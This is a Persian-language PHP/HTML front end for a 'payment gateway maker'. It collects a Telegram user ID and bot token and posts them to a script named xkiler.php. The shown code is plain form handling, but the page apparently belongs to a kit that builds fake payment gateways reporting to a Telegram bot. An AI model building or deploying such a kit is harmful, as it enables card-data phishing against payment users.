	
<?php 

include"INFO.php";

?>
<!DOCTYPE html>
<html lang="fa" xmlns="http://www.w3.org/1999/xhtml">
<head>
<title> ✓ درگاه ساز پاندا و آنابل✓ </title><meta charset="utf-8" />
<meta name="generator" content="Payment Maker" />
<meta name="author" content="<?php echo $Team;?>" />
<meta name="robot" content="noindex,follow" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<link type="text/css" rel="stylesheet" href="css/StyleSheet.css" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
function showpayment(str) {
if (str.length == 0) {
document.getElementById("request").innerHTML = "";
return;} 
else {var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("request").innerHTML = this.responseText;}};
xmlhttp.open("post", "xkiler.php");
xmlhttp.send();}}
</script><script>
var div = 'alert';
var loadingmessage = '';
function Ajaxrequest(){
var xmlHttp;
try{
xmlHttp=new XMLHttpRequest();
return xmlHttp;}
catch (e){
try{xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");
return xmlHttp;}
catch (e){
try{xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
return xmlHttp;}
catch (e){
alert("لطفا مرورگر خود را آپدیت نمایید");
return false;}}}}
function formget(form, url) {
var poststr = getFormValues(form);
postData(url, poststr);}
function postData(url, parameters){
var xmlHttp = Ajaxrequest();
xmlHttp.onreadystatechange =  function(){
if(xmlHttp.readyState > 0 && xmlHttp.readyState < 4){
document.getElementById(div).innerHTML=loadingmessage;}
if (xmlHttp.readyState == 4) {
document.getElementById(div).innerHTML=xmlHttp.responseText;}}
xmlHttp.open("POST", "xkiler.php");
xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlHttp.send(parameters);}
function getFormValues(formobj){
var str = "";
var valueArr = null;
var val = "";
var cmd = "";
for(var i = 0;i < formobj.elements.length;i++){
switch(formobj.elements[i].type){

case "text":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "tel":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "email":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "password":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "url":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "textarea":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "select-one":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "hidden":
str += formobj.elements[i].name +
"=" + encodeURI(formobj.elements[i].value) + "&";
break;

case "checkbox":
if(formobj.elements[i].checked == true){str += formobj.elements[i].name + "=" + formobj.elements[i].value + "&";}
break;

}}
str = str.substr(0,(str.length - 1));
return str;}
</script></head><body>
<div class="box animated zoomIn">
<form method="post" action="#" autocomplete="off">
<input type="tel" name="ID" class="inputs animated fadeInDown delay-1s" maxlength="12" placeholder="آیدی عددی" required/>
<input type="text" name="TOKEN" class="inputs animated fadeInDown delay-2s" maxlength="50" placeholder="توکن ربات" required/>
<button type="button" class="btn start animated fadeInUp delay-3s" onclick="formget(this.form, 'finish');" >ساخت درگاه</button>
</form></div>
	

<div id="alert"></div>
<footer class="animated slideInUp">  <a href="https://t.me/<?php echo $chanel;?>">کانال تلگرام <?php echo $chanel;?></a></footer>
</body></html>
